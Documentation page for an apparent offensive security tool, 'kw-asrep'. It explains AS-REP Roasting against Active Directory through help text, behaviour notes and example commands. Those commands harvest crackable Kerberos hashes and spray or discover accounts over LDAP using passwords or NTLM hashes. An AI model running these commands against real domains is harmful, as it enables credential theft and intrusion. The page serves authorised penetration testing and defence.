# kw-asrep

AS-REP Roast. Extract hashes from accounts that don't require Kerberos pre-authentication.

For a full explanation of the attack, see the [guide](../guide/index.md) and [attacks in depth](../background/attacks.md#as-rep-roast).

## Help

```
$ kw-asrep -h
usage: kw-asrep [-h] [--version] [-v] [-t USER] [-T FILE] [--ldap]
                [--ldap-all] [--ldap-ssl] [-u USER] [-p PASS] [-H HASH] [-k]
                [-c FILE] [-d DOMAIN] [--dc-ip IP] [--dc-hostname HOST]
                [--transport {tcp,udp}] [--timeout TIMEOUT] [-e ETYPE]
                [-o FILE]

AS-REP Roast - extract hashes from accounts without Kerberos pre-authentication.

options:
  -h, --help            show this help message and exit
  --version             show program's version number and exit
  -v, --verbose         Increase verbosity (-v, -vv)

targets (no authentication required):
  The attack sends AS-REQs without pre-auth. Accounts that require pre-auth are silently skipped.

  -t USER, --target USER
                        Target username (repeatable)
  -T FILE, --targets-file FILE
                        File with usernames, one per line (# comments, blank
                        lines skipped)

LDAP discovery (requires authentication):
  Query LDAP to find DONT_REQUIRE_PREAUTH accounts or spray all users.

  --ldap                Discover accounts with DONT_REQUIRE_PREAUTH set
  --ldap-all            Try every enabled user (spray)
  --ldap-ssl            Use LDAPS (port 636)

NTLM authentication (for LDAP):
  -u USER, --user USER  Username (sAMAccountName)
  -p PASS, --password PASS
                        Cleartext password
  -H HASH, --hashes HASH
                        NTLM hash - LM:NT, :NT, or NT

Kerberos authentication (for LDAP):
  Domain and user are auto-detected from the ccache.

  -k, --kerberos        Use Kerberos auth via ccache
  -c FILE, --ccache FILE
                        CCache file with TGT (or set KRB5CCNAME)

connection:
  -d DOMAIN, --domain DOMAIN
                        Domain FQDN (auto-detected from ccache with -k)
  --dc-ip IP            DC IP or hostname (resolved via DNS SRV if omitted)
  --dc-hostname HOST    DC FQDN for Kerberos SPN (auto-detected if omitted)
  --transport {tcp,udp}
                        Transport protocol (default: tcp)
  --timeout TIMEOUT     Network timeout in seconds (default: 10)

output:
  -e ETYPE, --enctype ETYPE
                        Encryption type(s) in preference order, repeatable or
                        comma-separated (choices: des-cbc-crc, des-cbc-md5,
                        rc4, aes128, aes256; default: rc4)
  -o FILE, --output FILE
                        Write hashes to file

Examples:
  kw-asrep -d CORP.LOCAL --dc-ip 10.0.0.1 -t jsmith
  kw-asrep -d CORP.LOCAL -T users.txt -o hashes.txt
  kw-asrep -d CORP.LOCAL --dc-ip 10.0.0.1 -u admin -p pass --ldap
  kw-asrep -k -c admin.ccache --ldap
```

## Behaviour

- **Requests.** One AS-REQ without pre-authentication is sent per target. Accounts that require pre-authentication answer with a KDC error and are skipped without a message; `-vv` shows them.
- **User field.** The username in the hash is taken from the salt in the AS-REP (ETYPE-INFO2 for RC4 and AES, PA-PW-SALT for DES), so its spelling is the one the key was derived with even if the target was typed in another case. When the reply carries no salt, the name is used as typed, and a warning is logged if the hash is not RC4.
- **Etype.** The hash is labelled with the etype of the reply, which the KDC chooses from the `-e` list and the account's keys.
- **Output.** `-o` never overwrites. If the file exists, the hashes go to `name_1.ext`, then `name_2.ext`, and so on.

## Examples

```bash
# Single target (no credentials needed)
kw-asrep -d CORP.LOCAL --dc-ip 10.0.0.1 -t jsmith

# Multiple targets from file
kw-asrep -d CORP.LOCAL --dc-ip 10.0.0.1 -T users.txt -o hashes.txt

# LDAP auto-discovery
kw-asrep -d CORP.LOCAL --dc-ip 10.0.0.1 -u admin -p pass --ldap

# Kerberos auth for LDAP (domain from ccache)
kw-asrep -k -c admin.ccache --ldap
```
